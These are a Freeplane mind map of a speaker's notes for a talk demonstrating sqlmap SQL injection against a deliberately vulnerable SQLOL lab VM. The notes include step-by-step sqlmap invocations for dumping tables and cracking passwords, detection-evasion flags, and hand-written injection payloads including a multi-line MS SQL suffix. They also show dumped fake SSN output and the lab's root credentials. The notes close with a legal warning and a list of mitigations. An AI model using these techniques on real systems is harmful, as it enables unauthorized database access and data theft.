<map version="freeplane 1.2.0">
<!--To view this file, download free mind mapping software Freeplane from http://freeplane.sourceforge.net -->
<attribute_registry RESTRICTED="true" SHOW_ATTRIBUTES="hide" FONT_SIZE="12"/>
<node TEXT="SQLMAP&#xa;talk" FOLDED="false" ID="ID_1612087951" CREATED="1336160029538" MODIFIED="1376394955672" BACKGROUND_COLOR="#effaca"><hook NAME="MapStyle" background="#d9e4b1" zoom="0.75">
    <properties show_icon_for_attributes="true" show_note_icons="true"/>

<map_styles>
<stylenode LOCALIZED_TEXT="styles.root_node">
<stylenode LOCALIZED_TEXT="styles.predefined" POSITION="right">
<stylenode LOCALIZED_TEXT="default" MAX_WIDTH="400" COLOR="#000000" BACKGROUND_COLOR="#effaca" STYLE="bubble">
<font NAME="SansSerif" SIZE="12" BOLD="false" ITALIC="false"/>
</stylenode>
<stylenode LOCALIZED_TEXT="defaultstyle.details"/>
<stylenode LOCALIZED_TEXT="defaultstyle.note"/>
<stylenode LOCALIZED_TEXT="defaultstyle.floating">
<edge STYLE="hide_edge"/>
<cloud COLOR="#f0f0f0" SHAPE="ROUND_RECT"/>
</stylenode>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.user-defined" POSITION="right">
<stylenode LOCALIZED_TEXT="styles.topic" COLOR="#18898b" STYLE="fork">
<font NAME="Liberation Sans" SIZE="12" BOLD="true"/>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.subtopic" COLOR="#cc3300" STYLE="fork">
<font NAME="Liberation Sans" SIZE="12" BOLD="true"/>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.subsubtopic" COLOR="#669900">
<font NAME="Liberation Sans" SIZE="12" BOLD="true"/>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.important">
<cloud COLOR="#ff0000" SHAPE="ROUND_RECT"/>
<font BOLD="true"/>
</stylenode>
<stylenode TEXT="Application" BACKGROUND_COLOR="#effaca" STYLE="bubble">
<font NAME="Liberation Sans" SIZE="12" BOLD="true"/>
<attribute_layout NAME_WIDTH="109" VALUE_WIDTH="100"/>
<attribute NAME="Date Started" VALUE=""/>
</stylenode>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.AutomaticLayout" POSITION="right">
<stylenode LOCALIZED_TEXT="AutomaticLayout.level.root" COLOR="#000000">
<font SIZE="20"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,1" COLOR="#0033ff">
<font SIZE="18"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,2" COLOR="#00b439">
<font SIZE="16"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,3" COLOR="#990000">
<font SIZE="14"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,4" COLOR="#111111">
<font SIZE="12"/>
</stylenode>
</stylenode>
</stylenode>
</map_styles>
</hook>
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="Prep work" POSITION="right" ID="ID_505079556" CREATED="1377190472285" MODIFIED="1377190492091">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="logon as admin, run private network msi from desktop" ID="ID_628909492" CREATED="1378036595149" MODIFIED="1378036611676">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="add inbound firewall rule to open port 1433 to private networks (?) (instructions in .txt file)" ID="ID_4411131" CREATED="1378036613756" MODIFIED="1378036689928">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="start virtual box, and check the network settings (192.168.56.xxx)" ID="ID_1032823182" CREATED="1378036747421" MODIFIED="1378036770362">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Start VM BackTrack 5R3 sqlmap demo" ID="ID_1166042987" CREATED="1377190493454" MODIFIED="1377190517021">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="if the machine was turned off" ID="ID_1325470062" CREATED="1377190598501" MODIFIED="1377190606707">
<attribute_layout VALUE_WIDTH="100"/>
<node ID="ID_840136175" CREATED="1377190607446" MODIFIED="1377190681369"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      start mysql:
    </p>
    <p>
      <b><font face="Consolas">service mysql start </font></b>
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="start apache:&#xa;service apache2 start" ID="ID_1195762607" CREATED="1377190707152" MODIFIED="1377190754765">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="start fiddler, and be sure filters are turned off" ID="ID_262372332" CREATED="1377191188224" MODIFIED="1377191203886">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="(may want to try --disable-coloring" POSITION="right" ID="ID_942302234" CREATED="1376420268425" MODIFIED="1376420280007">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="There&apos;s more stuff in sqlmap than I can shake a stick at.  But so far there&apos;s never been anything I needed that wasn&apos;t there..." FOLDED="true" POSITION="right" ID="ID_1159753600" CREATED="1376413857680" MODIFIED="1376413889648">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="don&apos;t forget --purge-output" ID="ID_772561409" CREATED="1377187397682" MODIFIED="1377187408284">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="other options to discuss: -v verbosity" ID="ID_1282832364" CREATED="1377188771597" MODIFIED="1377188782699">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="--auth-type &amp; --auth-cred if you need to NTLM auth, for instance" ID="ID_1540128563" CREATED="1377194552675" MODIFIED="1377194589124">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="--safe-url, a &quot;safe&quot; request to make occasionally to prevent the app or detection device from blacklisting you for too many consecutive invalid attempts.  There are also many other WAF/IPS/IDS avoidance options." ID="ID_656719219" CREATED="1377194763586" MODIFIED="1377198220961">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="--force-ssl this one will drive you nuts if you forget it" ID="ID_961471946" CREATED="1377194857144" MODIFIED="1377194872686">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="--level specifies how many tests to run before sqlmap gives up.  default is 1, max is 5, i usually run at least 2." ID="ID_1986755821" CREATED="1377198739191" MODIFIED="1377198775099">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="--risk 1 to 3.  3 can potentially damage the data in the database (if an appropriate vulnerablity exists), which you might not want to do." ID="ID_471737331" CREATED="1377198795546" MODIFIED="1377271312603">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="if you&apos;re really lucky, you can use --os-cmd or --os-shell to run commands on the webserver itself, but the id you&apos;re using to connect has to have write privileges to the web root dir, which doesn&apos;t happen very often" ID="ID_1456871575" CREATED="1377199523899" MODIFIED="1377199596636">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="--sql-shell can be used to add a user, but it uses stacked queries and mysql doesn&apos;t support stacked queries.  could I get sqlol to connect back to an sql database on the windows machine????" ID="ID_775019270" CREATED="1377201147868" MODIFIED="1377201257024">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="would have to update /mcir/sqlol/includes/database.config.php - but I don&apos;t know if adodb module supports mssql. Doc says Yes!" ID="ID_1573841670" CREATED="1377201325174" MODIFIED="1377201630850">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="--tamper" ID="ID_768676265" CREATED="1377195789153" MODIFIED="1377195794696">
<icon BUILTIN="help"/>
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="using w/o explicit permission is a felony in KY.  I would not recommend you attempt to represent your self in court against felony charges.  Get a lawyer." POSITION="right" ID="ID_305506656" CREATED="1376494600522" MODIFIED="1376494641633">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Why?" FOLDED="true" POSITION="right" ID="ID_1755925022" CREATED="1376394959624" MODIFIED="1376394963784">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="one reason I see is vendor apps that weren&apos;t originally written as web apps, but merely converted.  This leads to all kinds of web vulns" ID="ID_1180688481" CREATED="1376394967001" MODIFIED="1376395006231">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="using SQLOL" POSITION="left" ID="ID_1624302027" CREATED="1376406012386" MODIFIED="1376406023563">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="http://192.168.56.101/mcir/sqlol/select.php" ID="ID_710037459" CREATED="1376492639619" MODIFIED="1376492672979" LINK="http://192.168.56.101/mcir/sqlol/select.php">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="challenge 1" FOLDED="true" ID="ID_306860958" CREATED="1376406024513" MODIFIED="1377200511699">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <i>(not stacked queries susceptible)</i>
    </p>
  </body>
</html>
</richcontent>
<node TEXT="start up sqlmap" ID="ID_1057627896" CREATED="1376406031458" MODIFIED="1376498884927">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="cd \InstallPrograms\sqlmap\sqlmapproject-sqlmap-4929cff" ID="ID_1543869082" CREATED="1376406052788" MODIFIED="1376406079811">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="capture a sample request using fiddler" FOLDED="true" ID="ID_380675861" CREATED="1377187512467" MODIFIED="1377187627144">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="Call up webpage" ID="ID_1415613612" CREATED="1377187628259" MODIFIED="1377187647230">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="put an identifiable string in the injection field and submit" ID="ID_999784021" CREATED="1377187703769" MODIFIED="1377187732067">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="this one is a GET query, so we can get what we need from the browser address bar" ID="ID_1901370937" CREATED="1377189557799" MODIFIED="1377189573974">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="copy the string from the address bar.  note the name of the injection field" ID="ID_233496605" CREATED="1377187885265" MODIFIED="1377189601851">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="sqlmap.py&#xa;-u (paste url)&#xa;-p inject_string&#xa;-o" ID="ID_1807226563" CREATED="1376406103495" MODIFIED="1377189413798">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      this should find UNION and error-based vulns
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="Now you can add&#xa;--tables&#xa;--technique U" ID="ID_492159816" CREATED="1376406250241" MODIFIED="1376406337319">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      and get all the tables in all the databases, if the id used to connect to the db has the necessary privileges.
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="Use -D mysql --passwords to retrieve and crack passwords" ID="ID_792542931" CREATED="1376406481954" MODIFIED="1377190936849">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
</node>
<node TEXT="challenge 5 (blind)" FOLDED="true" ID="ID_345395964" CREATED="1376494146078" MODIFIED="1376494169180">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="copy the request from fiddler" ID="ID_557277072" CREATED="1376494232196" MODIFIED="1376494248930">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="challenges...5" ID="ID_106608153" CREATED="1377191081721" MODIFIED="1377191091671">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="tools...options...monitor with fiddler...launch fiddler now" ID="ID_1984246724" CREATED="1377191056712" MODIFIED="1377191125264">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="be sure fiddler filters are turned off" ID="ID_1445420086" CREATED="1377191169871" MODIFIED="1377191179581">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="view request in RAW view&#xa;then click &quot;view in note&quot;&#xa;POST requests are usually easier to handle in request files.&#xa;Save the file." ID="ID_706242720" CREATED="1377191272198" MODIFIED="1377191322071">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="close fiddler" ID="ID_838398939" CREATED="1377191356555" MODIFIED="1377191361705">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="--purge-output" ID="ID_867183505" CREATED="1377191372893" MODIFIED="1377191388411">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node ID="ID_1113595530" CREATED="1376496216102" MODIFIED="1376496304119"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      sqlmap sometimes needs help.&#160;&#160;this is where other tools can come in handy. <i>(can we somehow use sqlmap to get us to this first step?)</i>
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="blind injection means that the app does not return data directly from the database.  instead, you just get an indication that something was successful or not.  in order for sqlmap to exploit, it has to have an input that will reliably return true or false (true is easier)" ID="ID_1672031535" CREATED="1376496327966" MODIFIED="1376496416098">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="-r (filename) -p inject_string --technique B --dbms MySQL" ID="ID_415844732" CREATED="1376494249604" MODIFIED="1377191573895">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      technique Boolean and dbms specified here just to speed things up.&#160;&#160;but we don't get any results :(
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="let&apos;s say that another tool has discovered that the common&#xa;&apos; or &apos;1&apos; = &apos;1&#xa;reliably returns a &quot;true&quot; condition.  insert that as the value for inject_string" ID="ID_252435678" CREATED="1376496425043" MODIFIED="1376496497158">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="-r (filename) -p inject_string --technique B --dbms MySQL" ID="ID_1876528074" CREATED="1376494249604" MODIFIED="1376496633445">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      technique Boolean and dbms specified here just to speed things up.
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="you&apos;ll get a warning that there an injection attempt already there.  normally this would indicate that you had done something wrong, but this time, it really is what we want." ID="ID_4651531" CREATED="1376495029752" MODIFIED="1376496777022">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      this should give us boolean-based blind where or having clause
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="First, go after the databases: --dbs" ID="ID_1653549524" CREATED="1377191796306" MODIFIED="1377191823595">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="now we go after the tables: -D sqlol --tables" ID="ID_1747087808" CREATED="1376496780633" MODIFIED="1377191866774">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      database sqlol.&#160;&#160;table ssn
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="get the data: -D sqlol -T ssn --dump" ID="ID_894533804" CREATED="1376496978448" MODIFIED="1376496999002">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      bob's your uncle
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="This would have been a real pain in the butt to do manually." ID="ID_326326923" CREATED="1376497010535" MODIFIED="1376497021318">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="challenge 10 (no WHERE)" ID="ID_86569367" CREATED="1376501044517" MODIFIED="1377200393955">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS" HIDDEN="true">

<html>
  <head>
    
  </head>
  <body>
    <p>
      (<i>not susceptible to stacked queries)</i>
    </p>
  </body>
</html>
</richcontent>
<node TEXT="--purge-output" ID="ID_790555861" CREATED="1376501057170" MODIFIED="1376501082936">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      start fresh
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="capture the new request in fiddler, and run w/ --dbms MySQL" ID="ID_1509200221" CREATED="1376501094820" MODIFIED="1376501140157">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      MySQL inline query should be detected
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="-D sqlol -T ssn --dump&#xa;just like before" ID="ID_460063748" CREATED="1376501222941" MODIFIED="1376501278843">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS" HIDDEN="true">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <font size="2" face="Consolas">Database: sqlol </font>
    </p>
    <p>
      <font size="2" face="Consolas">Table: ssn </font>
    </p>
    <p>
      <font size="2" face="Consolas">[5 entries] </font>
    </p>
    <p>
      <font size="2" face="Consolas">+-------------+-----------------------+ </font>
    </p>
    <p>
      <font size="2" face="Consolas">| ssn&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;| name&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;| </font>
    </p>
    <p>
      <font size="2" face="Consolas">+-------------+-----------------------+ </font>
    </p>
    <p>
      <font size="2" face="Consolas">| 000-00-1112 | Wengdack Slobdegoob&#160;&#160;&#160;| </font>
    </p>
    <p>
      <font size="2" face="Consolas">| 012-34-5678 | Herp Derper&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;| </font>
    </p>
    <p>
      <font size="2" face="Consolas">| 111-22-3333 | Peter Weiner&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;| </font>
    </p>
    <p>
      <font size="2" face="Consolas">| 666-67-6776 | Chunk MacRunfast&#160;&#160;&#160;&#160;&#160;&#160;| </font>
    </p>
    <p>
      <font size="2" face="Consolas">| 999-99-9999 | SlapdeBack LovedeFace | </font>
    </p>
    <p>
      <font size="2" face="Consolas">+-------------+-----------------------+</font>
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="or just --sql-shell&#xa;select version();" ID="ID_1942617125" CREATED="1377199811101" MODIFIED="1377199938722">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="--suffix" FOLDED="true" ID="ID_754695985" CREATED="1376501395769" MODIFIED="1377104763949">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="MS SQL server will allow the concatenation of multiple sql statements. sometimes a programmer will split these sql statements across multiple lines to defeat simple injection. sqlmap can help defeat the defeat." ID="ID_313503127" CREATED="1376510087446" MODIFIED="1377102919473">
<attribute_layout VALUE_WIDTH="100"/>
<hook NAME="FirstGroupNode"/>
</node>
<node TEXT="Just use SMS screen shots for this" ID="ID_1007598205" CREATED="1377102919437" MODIFIED="1377102936566">
<hook NAME="SummaryNode"/>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="local sql db JUNK" ID="ID_1807748403" CREATED="1376583285324" MODIFIED="1376583304155">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="First, put in a single tick:&#xa;@inrep = N&apos;&apos;&apos;&apos;," ID="ID_807088372" CREATED="1376606452627" MODIFIED="1376606549891">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Incorrect syntax near ' = username
    </p>
    <p>
      &#160;&#160;&#160;&#160;)
    </p>
    <p>
      union
    </p>
    <p>
      select username from supply
    </p>
    <p>
      where branch in (
    </p>
    <p>
      &#160;&#160;&#160;&#160;select branch from buyers wh'.
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="We see we&apos;re going to have to get rid of all that extra stuff after what appears to be a first WHERE clause.  a simple -- won&apos;t do it, because the command is split across several lines." ID="ID_1519554157" CREATED="1376606556772" MODIFIED="1376606611365">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="So we set up a dummy sql statement after our injection attempt:&#xa;@inrep = N&apos;a&apos;&apos;=&apos;&apos;a&apos;&apos;; select x from y where &apos;&apos;z&apos;" ID="ID_566207543" CREATED="1376606637891" MODIFIED="1376606751565">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Incorrect syntax near ';'.
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="probably because we don&apos;t have our parentheses lined up.  go back and look at the first error message.&#xa;@inrep = N&apos;a&apos;&apos;=&apos;&apos;a&apos;&apos;); select x from y where &apos;&apos;z&apos;" ID="ID_950056156" CREATED="1376606752025" MODIFIED="1376606847766">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Incorrect syntax near ')'.
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="Looks like we don&apos;t have enough &apos;(&apos; - stick one in&#xa;a&apos;&apos;=&apos;&apos;a&apos;&apos;); select x from y where (&apos;&apos;z" ID="ID_1905207710" CREATED="1376606960431" MODIFIED="1376659330527">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      results!
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="Now we can use this with a --suffix parameter in sqlmap" ID="ID_1044829608" CREATED="1376659340254" MODIFIED="1377023694444">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="EXEC [dbo].[uspSample]&#xa;@inbuy = N&apos;Sam&apos;,&#xa;@inrep = N&apos;a&apos;&apos;=&apos;&apos;a&apos;&apos;); select x from y where (&apos;&apos;x &apos;" ID="ID_1866489003" CREATED="1376605133614" MODIFIED="1376605211810">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
</node>
<node TEXT="mitigations" POSITION="right" ID="ID_1530212437" CREATED="1366647877989" MODIFIED="1366647881650">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="don&apos;t use SQL" ID="ID_307283954" CREATED="1366647952983" MODIFIED="1366647956373">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="whitelist" ID="ID_641793807" CREATED="1366647882852" MODIFIED="1366647886675">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="parameterize, or ensure that data are always treated as data and not executable statements.  most platforms today allow this." ID="ID_19680246" CREATED="1366647890533" MODIFIED="1366647943332">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="set database permissions as restrictive as possible" ID="ID_320715076" CREATED="1366647981463" MODIFIED="1366647997510">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="don&apos;t display error messages" ID="ID_783441272" CREATED="1366648001080" MODIFIED="1366648007191">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="SQLOL (MCIR) files are in /var/www/mcir&#xa;http://192.168.56.101/mcir/sqlol" LOCALIZED_STYLE_REF="defaultstyle.floating" POSITION="right" ID="ID_1222855336" CREATED="1377024143001" MODIFIED="1378146017521" HGAP="-88" VSHIFT="573">
<hook NAME="FreeNode"/>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="to access database: mysql sqlol --user=root --password=toor&#xa;tables (&quot;show tables;&quot;): ssn, users" LOCALIZED_STYLE_REF="defaultstyle.floating" POSITION="right" ID="ID_982239976" CREATED="1376510355196" MODIFIED="1378146006290" HGAP="-85" VSHIFT="659">
<hook NAME="FreeNode"/>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Alan, Bob, Charlie, David, Elias" LOCALIZED_STYLE_REF="defaultstyle.floating" POSITION="right" ID="ID_41802410" CREATED="1376511355864" MODIFIED="1378146014835" HGAP="-96" VSHIFT="775">
<hook NAME="FreeNode"/>
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
</map>
